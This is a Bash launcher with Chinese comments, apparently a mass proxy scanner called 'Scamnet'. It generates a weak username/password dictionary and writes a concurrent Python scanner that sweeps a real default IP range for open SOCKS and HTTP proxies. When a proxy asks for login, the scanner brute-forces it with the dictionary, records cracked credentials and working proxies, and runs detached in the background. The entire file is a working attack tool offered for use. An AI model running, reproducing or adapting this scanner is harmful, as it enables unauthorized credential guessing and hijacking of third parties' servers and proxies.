#!/bin/bash
# main.sh - Scamnet OTC 扫描器 (v7.0 稳定版)
# 修复: 进度条卡死、内存溢出、连接僵死问题
set -e
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"

echo -e "${BLUE}"
echo "███████╗ ██████╗ █████╗ ███╗   ███╗███╗   ██╗███████╗███████╗"
echo "██╔════╝██╔════╝██╔══██╗████╗ ████║████╗  ██║██╔════╝╚══███╔╝"
echo "███████╗██║     ███████║██╔████╔██║██╔██╗ ██║█████╗    ███╔╝ "
echo "╚════██║██║     ██╔══██║██║╚██╔╝██║██║╚██╗██║██╔══╝   ███╔╝  "
echo "███████║╚██████╗██║  ██║██║ ╚═╝ ██║██║ ╚████║███████╗███████╗"
echo "╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝"
echo -e "${NC}"
echo -e "${GREEN}[OTC] Scamnet v7.0 Stable (分片引擎 + 内存自动回收)${NC}"

# ==================== 依赖检查 ====================
if [ ! -f ".deps_installed_v7" ]; then
    echo -e "${YELLOW}[*] 正在更新依赖库...${NC}"
    if ! command -v pip3 &>/dev/null; then
        if command -v apt >/dev/null; then sudo apt update -qq && sudo apt install -y python3-pip python3-dev; fi
        if command -v yum >/dev/null; then sudo yum install -y python3-pip python3-devel; fi
        if command -v apk >/dev/null; then apk add py3-pip python3-dev; fi
    fi
    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp aiohttp-socks tqdm PyYAML asyncio uvloop
    touch .deps_installed_v7
fi

# ==================== 系统调优 ====================
# 关键：提高文件描述符限制，防止 Too many open files 错误
ulimit -n 65535 2>/dev/null || true

# ==================== 配置输入 ====================
DEFAULT_START="157.254.32.0"
DEFAULT_END="157.254.52.255"
echo -e "${YELLOW}请输入起始 IP (默认: $DEFAULT_START):${NC}"
read -r START_IP
START_IP=${START_IP:-$DEFAULT_START}

echo -e "${YELLOW}请输入结束 IP (默认: $DEFAULT_END):${NC}"
read -r END_IP
END_IP=${END_IP:-$DEFAULT_END}

echo -e "${YELLOW}请输入端口 (默认: 1080):${NC}"
echo " 格式: 1080 或 1080 8080 或 1-65535"
read -r PORT_INPUT
PORT_INPUT=${PORT_INPUT:-1080}

# 端口解析
PORTS_CONFIG=""
if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
    PORTS_CONFIG="range: \"$PORT_INPUT\""
elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
    PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
else
    PORTS_CONFIG="ports: [$PORT_INPUT]"
fi

# ==================== 字典生成 (1000条) ====================
DICT_FILE="$LOG_DIR/passwords.txt"
if [ ! -f "$DICT_FILE" ] || [ "$(wc -l < "$DICT_FILE")" -lt 100 ]; then
    echo -e "${YELLOW}[*] 生成高频弱口令字典...${NC}"
    cat > generator.py << 'EOF'
users = ["root", "admin", "user", "proxy", "guest", "test", "support", "manager", "sysadmin", "oracle", "postgres", "pi", "ubnt", "administrator", "service"]
passwords = ["root", "admin", "123456", "12345678", "123456789", "1234567890", "1234", "password", "admin123", "123123", "qwerty", "pass", "test", "user", "guest", "888888", "111111", "12345", "000000", "proxy", "socks", "shadowsocks", "admin888", "pass1234", "Admin@123", "P@ssword", "toor", "changeme"]
import datetime
current_year = datetime.datetime.now().year
for y in range(2018, current_year + 2):
    passwords.append(str(y))
    passwords.append(f"admin{y}")
    passwords.append(f"Admin{y}")
combos = set()
for u in users: combos.add(f"{u}:{u}")
for u in users:
    for p in passwords:
        combos.add(f"{u}:{p}")
combos.add("admin:public")
combos.add("admin:system")
combos.add("administrator:admin")
combos.add("ubnt:ubnt")
with open("passwords.txt", "w") as f:
    for c in combos: f.write(c + "\n")
EOF
    python3 generator.py
    mv passwords.txt "$DICT_FILE"
    rm generator.py
fi

# ==================== 生成 Python 核心 ====================
RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
cat > "$RUN_SCRIPT" << EOF
#!/bin/bash
set -e
cd "\$(dirname "\$0")"

cat > config.yaml << CONFIG
input_range: "${START_IP}-${END_IP}"
$PORTS_CONFIG
timeout: 5.0
# 并发数：建议 2000-3000 之间，过高容易卡死
max_concurrent: 2500
protocol_order: ["socks5", "socks4", "http", "https"]
dict_path: "${DICT_FILE}"
CONFIG

cat > scanner_stable.py << 'PY'
#!/usr/bin/env python3
import asyncio
import aiohttp
import ipaddress
import sys
import yaml
import socket
import os
import gc
from aiohttp_socks import ProxyConnector, ProxyType, ProxyError, ProxyConnectionError
from tqdm.asyncio import tqdm
import warnings

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except: pass

warnings.filterwarnings("ignore")

# ==================== 配置 ====================
with open('config.yaml') as f: cfg = yaml.safe_load(f)
TIMEOUT = cfg.get('timeout', 5.0)
# 控制最大并发信号量
MAX_CONCURRENT = cfg.get('max_concurrent', 2500)
PROTOCOLS = cfg.get('protocol_order', ["socks5"])
DICT_PATH = cfg.get('dict_path', 'passwords.txt')

# 加载字典
PASS_LIST = []
if os.path.exists(DICT_PATH):
    with open(DICT_PATH, 'r') as f:
        PASS_LIST = [line.strip().split(':', 1) for line in f if ':' in line]
    PASS_LIST.insert(0, (None, None)) # 无密码优先
else:
    PASS_LIST = [(None, None)]

# ==================== 目标生成器 ====================
def get_targets():
    raw_range = cfg['input_range']
    raw_ports = cfg.get('ports', cfg.get('range'))
    
    ports = []
    if isinstance(raw_ports, str) and '-' in raw_ports:
        a, b = map(int, raw_ports.split('-'))
        ports = list(range(a, b + 1))
    elif isinstance(raw_ports, list):
        ports = [int(x) for x in raw_ports]
    else:
        ports = [int(raw_ports)]

    if '-' in raw_range:
        start_s, end_s = raw_range.split('-')
        start_ip = int(ipaddress.IPv4Address(start_s))
        end_ip = int(ipaddress.IPv4Address(end_s))
        count = end_ip - start_ip + 1
        # 即使数量很大，我们现在使用分片处理，不再限制总量
        return start_ip, count, ports
    return 0, 0, []

start_int, ip_count, ports = get_targets()

# ==================== 扫描逻辑 ====================
valid_lock = asyncio.Lock()
sem = asyncio.Semaphore(MAX_CONCURRENT)

async def check_proxy(ip, port, protocol, auth=None):
    target_url = "http://www.google.com/generate_204"
    
    # 严格的超时设置：连接 3s，总共 5s
    # 这能有效防止“卡主”
    timeout = aiohttp.ClientTimeout(total=TIMEOUT, sock_connect=3.0)
    
    connector = None
    try:
        if protocol.startswith("http"):
            proxy_url = f"http://{ip}:{port}"
            if auth: proxy_url = f"http://{auth[0]}:{auth[1]}@{ip}:{port}"
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start = asyncio.get_event_loop().time()
                async with session.get(target_url, proxy=proxy_url, ssl=False) as resp:
                    if resp.status == 407: return False, 0, "AUTH"
                    if resp.status < 400:
                        lat = int((asyncio.get_event_loop().time() - start) * 1000)
                        return True, lat, "OK"
                    return False, 0, "ERR"
        elif protocol.startswith("socks"):
            pt = ProxyType.SOCKS5 if protocol == "socks5" else ProxyType.SOCKS4
            u, p = auth if auth else (None, None)
            connector = ProxyConnector(proxy_type=pt, host=ip, port=port, username=u, password=p, rdns=True)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                start = asyncio.get_event_loop().time()
                async with session.get(target_url, ssl=False) as resp:
                    if resp.status < 400:
                        lat = int((asyncio.get_event_loop().time() - start) * 1000)
                        return True, lat, "OK"
    except (ProxyConnectionError, OSError, asyncio.TimeoutError):
        return False, 0, "DEAD"
    except ProxyError:
        return False, 0, "AUTH" # 极大概率是认证失败
    except Exception:
        return False, 0, "DEAD"
    finally:
        if connector:
            try: await connector.close()
            except: pass
    return False, 0, "DEAD"

async def save(res, lat):
    print(f"\r\033[32m[+] 捕获: {res} ({lat}ms)\033[0m")
    async with valid_lock:
        with open("proxy_valid.txt", "a") as f: f.write(f"{res}#{lat}ms\n")

async def worker(ip, port, pbar):
    async with sem:
        try:
            for scheme in PROTOCOLS:
                # 1. 无密探测
                ok, lat, status = await check_proxy(ip, port, scheme, None)
                if ok:
                    await save(f"{scheme}://{ip}:{port}", lat)
                    return
                
                # 2. 智能跳过：如果不通，直接跳过所有协议
                if status == "DEAD":
                    # 如果 TCP 都不通，换协议也没用，直接退出
                    return 

                # 3. 认证爆破
                if status == "AUTH":
                    for user, pwd in PASS_LIST[1:]:
                        ok2, lat2, _ = await check_proxy(ip, port, scheme, (user, pwd))
                        if ok2:
                            await save(f"{scheme}://{user}:{pwd}@{ip}:{port}", lat2)
                            return
        finally:
            # 无论成功失败，必须更新进度条
            pbar.update(1)

async def main():
    if ip_count == 0: return
    
    total_tasks = ip_count * len(ports)
    print(f"[*] 任务总量: {total_tasks} | 模式: 分片执行 (防止卡死)")
    
    # 分片大小：每批处理 5000 个 IP-Port 组合
    # 这通过定期清空 EventLoop 中的 Task 来防止内存泄漏和卡死
    BATCH_SIZE = 5000
    
    # 生成所有任务参数列表 (仅作为元组，占用内存极小)
    all_params = []
    curr = start_int
    for _ in range(ip_count):
        ip_s = str(ipaddress.IPv4Address(curr))
        for p in ports:
            all_params.append((ip_s, p))
        curr += 1
    
    # 初始化总进度条
    pbar = tqdm(total=total_tasks, unit="task", ncols=90)
    
    # 分批执行
    for i in range(0, len(all_params), BATCH_SIZE):
        batch = all_params[i : i + BATCH_SIZE]
        
        # 创建当前批次的 asyncio 任务
        tasks = [worker(ip, p, pbar) for ip, p in batch]
        
        # 等待当前批次全部完成
        await asyncio.gather(*tasks)
        
        # 关键：强制垃圾回收，释放内存
        gc.collect()
        
    pbar.close()
    print(f"\n[+] 扫描结束. 结果: proxy_valid.txt")

if __name__ == '__main__':
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] 停止")
PY

chmod +x scanner_stable.py
echo "# 启动时间: \$(date)" > result.log
python3 scanner_stable.py 2>&1 | tee -a result.log
EOF

chmod +x "$RUN_SCRIPT"

# ==================== 启动 ====================
echo -e "${GREEN}[*] 任务已重建: $RUN_SCRIPT${NC}"
echo -e "${YELLOW}[*] 正在启动... (查看进度: tail -f $LATEST_LOG)${NC}"

# 杀掉旧进程 (如果有)
pkill -f scanner_stable.py || true

nohup "$RUN_SCRIPT" > "$LATEST_LOG" 2>&1 &
PID=$!
echo -e "${GREEN}[SUCCESS] 扫描器 (v7.0) 运行中! PID: $PID${NC}"
